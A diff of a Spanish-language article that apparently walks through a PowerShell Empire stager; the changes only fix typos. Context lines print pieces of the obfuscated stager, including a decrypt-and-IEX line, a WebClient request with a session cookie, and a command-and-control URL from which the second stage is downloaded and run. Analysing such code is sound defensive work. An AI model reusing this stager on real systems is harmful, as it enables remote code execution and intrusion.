@@ -76,7 +76,7 @@ $Data=$DATa[4..$DATA.LENgTh];
 -jOiN[ChaR[]](& $R $Data ($IV+$K))|IEX
 ```
 
-A continuación, eliminemos la parte del IF, para simplificar, y enfoquemonos en el resto del código. También organicé un poco el código, para poder agrupar las partes que funcionan juntas y explicar cada una por separado.
+A continuación, eliminemos la parte del IF, para simplificar, y enfoquémonos en el resto del código. También organicé un poco el código, para poder agrupar las partes que funcionan juntas y explicar cada una por separado.
 
 ```
 [System.Net.ServicePointManager]::Expect100Continue=0;
@@ -155,7 +155,7 @@ wc.Headers["User-Agent"] = ua;
 wc.Headers["Cookie"] = "session=968PH6bE9CDkwYGfsUPraz0x5PQ=";
 ```
 
-Luego, debemos especificar la dirección del servidor, el puerto y la ubicación de destino, en nuestro caso esta es la URL completa http://192.168.6.119:80/CWoNaJLBo/VTNeWw11212/. Después de eso, llamamos al método DownloadData de la clase Web.Client para guardar los datos en la variable $data. Si tienes curiosidad acerca de los datos con tenidos en esta $data (stae 2) generalmente se encuentra en /opt/Empire/data/agent/stagers/http.ps1.
+Luego, debemos especificar la dirección del servidor, el puerto y la ubicación de destino, en nuestro caso esta es la URL completa http://192.168.6.119:80/CWoNaJLBo/VTNeWw11212/. Después de eso, llamamos al método DownloadData de la clase Web.Client para guardar los datos en la variable $data. Si tienes curiosidad acerca de los datos con tenidos en esta $data (stage 2) generalmente se encuentra en /opt/Empire/data/agent/stagers/http.ps1.
 
 ```
 # PoweShell Set Server Address and Download the data.
